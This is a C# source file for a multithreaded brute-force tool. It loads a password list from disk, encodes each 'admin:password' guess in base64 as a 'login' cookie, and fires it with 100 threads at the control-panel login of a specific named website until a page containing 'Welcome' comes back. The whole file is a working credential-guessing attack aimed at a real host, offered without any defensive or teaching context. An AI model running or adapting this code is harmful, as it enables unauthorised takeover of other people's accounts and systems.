using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Net;
using System.IO;
namespace BruteForce
{
    class BruteForce
    {
        static List<string> passList = new List<string>();
        static string user = "admin";
        static string password = "Didn't get the passowrd! :'(";
        static EventWaitHandle handle = new AutoResetEvent(false);
        static int id = 0;
        static void Main(string[] args)
        {
            string pass = "";
            int numThreads = 100;
            Thread[] threads = new Thread[numThreads];
            StreamReader file = new StreamReader("c:\\passList.txt");
            while ((pass = file.ReadLine()) != null)
                passList.Add(pass);
            file.Close();
            for (int i= 0; i < numThreads; i++)
            {
                ThreadStart start = new ThreadStart(CheckPass);
                threads[i] = new Thread(start);
                threads[i].Start();
            }
            handle.WaitOne();
            foreach (Thread thread in threads)
                thread.Abort();
            Console.WriteLine("\n\nPassword is: " + password);
            Console.Read();
        }
        public static void CheckPass()
        {
            for(; id < passList.Count; )
            {
                string pass = passList[id];
                id++;
                string encoded = Connect(Convert.ToBase64String(Encoding.ASCII.GetBytes(user + ":" + pass)));
                if (encoded.Contains("Welcome"))
                {
                    password = pass;
                    handle.Set();
                    break;
                }
                Console.WriteLine(pass);
            }
        }
        public static string Connect(string cookieValue)
        {
            string url = @"http://www.dark0day.com/cp/index.php?do=login";
            HttpWebRequest request = WebRequest.Create(url) as HttpWebRequest;
            request.CookieContainer = new CookieContainer();
            Cookie cookie = new Cookie("login", cookieValue);
            request.CookieContainer.Add(new Uri(url), cookie);
            HttpWebResponse response = request.GetResponse() as HttpWebResponse;
            var encoding = ASCIIEncoding.ASCII;
            StreamReader reader = new StreamReader(response.GetResponseStream());
            return reader.ReadToEnd();
        }
    }
}
